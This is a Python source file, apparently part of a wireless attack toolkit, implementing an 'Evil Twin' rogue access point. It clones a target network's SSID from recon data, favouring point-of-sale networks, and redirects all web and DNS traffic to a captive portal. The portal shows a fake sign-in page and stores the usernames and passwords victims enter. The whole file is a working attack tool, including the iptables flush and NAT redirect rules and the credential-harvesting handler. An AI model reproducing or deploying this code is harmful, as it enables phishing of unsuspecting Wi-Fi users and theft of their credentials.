"""
Rogue Access Point Engine (Evil Twin)
─────────────────────────────────────
Creates a rogue AP mimicking a target discovered by the recon scanner.

Linux:  Uses hostapd + dnsmasq + iptables
Windows: Uses netsh hosted network + DNS redirect + captive portal

Target SSID, channel, and MAC are pulled from the recon database.
"""

import os
import subprocess
import time
import threading
import http.server
from urllib.parse import parse_qs

from scapy.all import RandMAC

from .config import (
    CAPTIVE_PORTAL_PORT, NETWORK_GW_IP, NETWORK_MASK,
    DHCP_LEASE, DNS_CONF_PATH, IS_WINDOWS, IS_LINUX, log,
)


class RogueAPEngine:
    """
    Evil Twin AP engine. All parameters can be auto-populated from recon data.
    """

    def __init__(self, interface, ssid, channel, db, mac_address=None,
                 use_wpa=False, wpa_passphrase=None):
        self.interface = interface
        self.ssid = ssid
        self.channel = str(channel)
        self.db = db
        self.mac_address = mac_address or str(RandMAC())
        self.use_wpa = use_wpa
        self.wpa_passphrase = wpa_passphrase
        self._hostapd_proc = None
        self._dnsmasq_proc = None
        self._portal_server = None
        self._portal_thread = None
        self.running = False

    @classmethod
    def from_recon_db(cls, interface, db, target_bssid=None):
        """
        Factory: create a RogueAPEngine using data scanned by ReconEngine.
        If target_bssid is None, automatically picks the strongest POS AP.
        """
        if target_bssid:
            db.cursor.execute(
                'SELECT bssid, ssid, channel FROM access_points WHERE bssid = ?',
                (target_bssid,))
            row = db.cursor.fetchone()
        else:
            row = db.get_strongest_pos_ap()
            if not row:
                row = db.get_strongest_ap()

        if not row:
            log.error("No target AP found in recon data")
            return None

        bssid = row[0]
        ssid = row[1] or "FreeWiFi"
        channel = row[2] or 6

        log.info(f"RogueAP auto-configured from recon: '{ssid}' ch {channel} (target {bssid})")
        return cls(interface=interface, ssid=ssid, channel=channel, db=db)

    def _write_hostapd_conf(self):
        conf_path = "/tmp/hostapd-rogue.conf"
        config = (
            f"interface={self.interface}\n"
            f"driver=nl80211\n"
            f"ssid={self.ssid}\n"
            f"hw_mode=g\n"
            f"channel={self.channel}\n"
            f"wmm_enabled=0\n"
            f"macaddr_acl=0\n"
            f"auth_algs=1\n"
            f"ignore_broadcast_ssid=0\n"
        )
        if self.use_wpa and self.wpa_passphrase:
            config += (
                f"wpa=2\n"
                f"wpa_passphrase={self.wpa_passphrase}\n"
                f"wpa_key_mgmt=WPA-PSK\n"
                f"rsn_pairwise=CCMP\n"
            )
        with open(conf_path, 'w') as f:
            f.write(config)
        return conf_path

    def _configure_interface(self):
        """Configure the AP interface with IP addressing (cross-platform)."""
        if IS_WINDOWS:
            # Windows: use netsh to set up hosted network
            subprocess.run(
                ["netsh", "wlan", "set", "hostednetwork",
                 f"mode=allow", f"ssid={self.ssid}", f"key=12345678"],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
        else:
            cmds = [
                ["ip", "link", "set", self.interface, "down"],
                ["ip", "link", "set", self.interface, "address", self.mac_address],
                ["ip", "link", "set", self.interface, "up"],
                ["ip", "addr", "flush", "dev", self.interface],
                ["ip", "addr", "add", f"{NETWORK_GW_IP}/24", "dev", self.interface],
            ]
            for cmd in cmds:
                subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
        time.sleep(0.5)

    def _start_dnsmasq(self):
        """Start DNS/DHCP — Linux uses dnsmasq, Windows uses built-in or skips."""
        if IS_WINDOWS:
            # Windows hosted network handles DHCP. We just log.
            log.info("Windows mode: DHCP handled by hosted network")
            return
        config = (
            f"no-resolv\n"
            f"interface={self.interface}\n"
            f"dhcp-range={DHCP_LEASE}\n"
            f"address=/#/{NETWORK_GW_IP}\n"
        )
        with open(DNS_CONF_PATH, 'w') as f:
            f.write(config)
        self._dnsmasq_proc = subprocess.Popen(
            ["dnsmasq", "-C", DNS_CONF_PATH, "-d"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        log.info("dnsmasq started (DHCP + wildcard DNS)")

    def _setup_iptables(self):
        """Set up traffic redirect — iptables on Linux, netsh on Windows."""
        if IS_WINDOWS:
            # Windows: use netsh portproxy for redirect (limited but functional)
            rules = [
                f"netsh interface portproxy add v4tov4 listenport=80 listenaddress=0.0.0.0 "
                f"connectport={CAPTIVE_PORTAL_PORT} connectaddress={NETWORK_GW_IP}",
                f"netsh interface portproxy add v4tov4 listenport=443 listenaddress=0.0.0.0 "
                f"connectport={CAPTIVE_PORTAL_PORT} connectaddress={NETWORK_GW_IP}",
            ]
            for rule in rules:
                subprocess.run(rule.split(), stdout=subprocess.DEVNULL,
                               stderr=subprocess.DEVNULL, timeout=5)
            log.info("Windows portproxy redirect configured")
        else:
            rules = [
                "iptables -F",
                "iptables -t nat -F",
                f"iptables -t nat -A PREROUTING -i {self.interface} -p tcp --dport 80 "
                f"-j DNAT --to-destination {NETWORK_GW_IP}:{CAPTIVE_PORTAL_PORT}",
                f"iptables -t nat -A PREROUTING -i {self.interface} -p tcp --dport 443 "
                f"-j DNAT --to-destination {NETWORK_GW_IP}:{CAPTIVE_PORTAL_PORT}",
                f"iptables -t nat -A PREROUTING -i {self.interface} -p udp --dport 53 "
                f"-j DNAT --to-destination {NETWORK_GW_IP}:53",
                f"iptables -t nat -A PREROUTING -i {self.interface} -p tcp --dport 53 "
                f"-j DNAT --to-destination {NETWORK_GW_IP}:53",
            ]
            for rule in rules:
                subprocess.run(rule.split(), stdout=subprocess.DEVNULL,
                               stderr=subprocess.DEVNULL, timeout=5)
            log.info("iptables captive portal redirect configured")

    def _start_captive_portal(self):
        db_ref = self.db
        ssid_ref = self.ssid

        class Handler(http.server.BaseHTTPRequestHandler):
            def log_message(self, fmt, *args):
                pass

            def do_GET(self):
                self.send_response(200)
                self.send_header("Content-Type", "text/html")
                self.end_headers()
                self.wfile.write(self._page().encode())

            def do_POST(self):
                length = int(self.headers.get("Content-Length", 0))
                body = self.rfile.read(length).decode(errors='ignore')
                params = parse_qs(body)
                username = params.get("username", params.get("email", [""]))[0]
                password = params.get("password", params.get("pass", params.get("pwd", [""])))[0]
                if username or password:
                    db_ref.log_credential(self.client_address[0], "", username, password, self.path)
                self.send_response(200)
                self.send_header("Content-Type", "text/html")
                self.end_headers()
                self.wfile.write(b'<html><body><h1>Connected</h1>'
                                 b'<p>You are now connected to the network.</p></body></html>')

            def _page(self):
                return (
                    '<!DOCTYPE html><html><head><meta charset="utf-8">'
                    '<meta name="viewport" content="width=device-width,initial-scale=1">'
                    f'<title>{ssid_ref} - Sign In</title><style>'
                    '*{margin:0;padding:0;box-sizing:border-box}'
                    'body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;'
                    'background:#f0f2f5;display:flex;align-items:center;justify-content:center;min-height:100vh}'
                    '.c{background:#fff;border-radius:12px;box-shadow:0 4px 24px rgba(0,0,0,.1);'
                    'padding:48px 40px;max-width:400px;width:90%}'
                    'h1{font-size:22px;margin-bottom:8px}p{color:#666;margin-bottom:24px;font-size:14px}'
                    'label{display:block;font-size:13px;font-weight:600;margin-bottom:6px}'
                    'input{width:100%;padding:12px;border:1px solid #ddd;border-radius:8px;'
                    'font-size:15px;margin-bottom:16px}'
                    'button{width:100%;padding:14px;background:#0066ff;color:#fff;border:none;'
                    'border-radius:8px;font-size:16px;font-weight:600;cursor:pointer}'
                    '</style></head><body><div class="c">'
                    f'<h1>Welcome to {ssid_ref}</h1>'
                    '<p>Sign in to access the network.</p>'
                    '<form method="POST" action="/login">'
                    '<label>Email or Username</label>'
                    '<input type="text" name="username" required>'
                    '<label>Password</label>'
                    '<input type="password" name="password" required>'
                    '<button type="submit">Sign In</button>'
                    '</form></div></body></html>'
                )

        server = http.server.HTTPServer((NETWORK_GW_IP, CAPTIVE_PORTAL_PORT), Handler)
        self._portal_server = server
        self._portal_thread = threading.Thread(target=server.serve_forever, daemon=True)
        self._portal_thread.start()
        log.info(f"Captive portal on {NETWORK_GW_IP}:{CAPTIVE_PORTAL_PORT}")

    def start(self):
        self.running = True
        self._configure_interface()

        if IS_WINDOWS:
            # Start Windows hosted network
            result = subprocess.run(
                ["netsh", "wlan", "start", "hostednetwork"],
                capture_output=True, text=True, timeout=10)
            if result.returncode != 0:
                log.error(f"Hosted network failed: {result.stderr.strip()}")
                log.info("Falling back to captive portal only mode")
            else:
                log.info(f"Windows hosted network '{self.ssid}' started")
        else:
            conf_path = self._write_hostapd_conf()
            self._hostapd_proc = subprocess.Popen(
                ["hostapd", conf_path],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(2)
            if self._hostapd_proc.poll() is not None:
                log.error("hostapd failed to start")
                self.running = False
                return False
            log.info(f"Rogue AP '{self.ssid}' active on {self.interface} ch {self.channel}")

        self._start_dnsmasq()
        self._setup_iptables()
        self._start_captive_portal()
        return True

    def stop(self):
        self.running = False
        if self._portal_server:
            self._portal_server.shutdown()

        if IS_WINDOWS:
            subprocess.run(["netsh", "wlan", "stop", "hostednetwork"],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run("netsh interface portproxy reset".split(),
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        else:
            if self._hostapd_proc:
                self._hostapd_proc.terminate()
                try:
                    self._hostapd_proc.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    self._hostapd_proc.kill()
            if self._dnsmasq_proc:
                self._dnsmasq_proc.terminate()
                try:
                    self._dnsmasq_proc.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    self._dnsmasq_proc.kill()
            subprocess.run("iptables -F".split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run("iptables -t nat -F".split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            for f in ["/tmp/hostapd-rogue.conf", DNS_CONF_PATH]:
                if os.path.isfile(f):
                    os.remove(f)

        log.info("Rogue AP torn down")
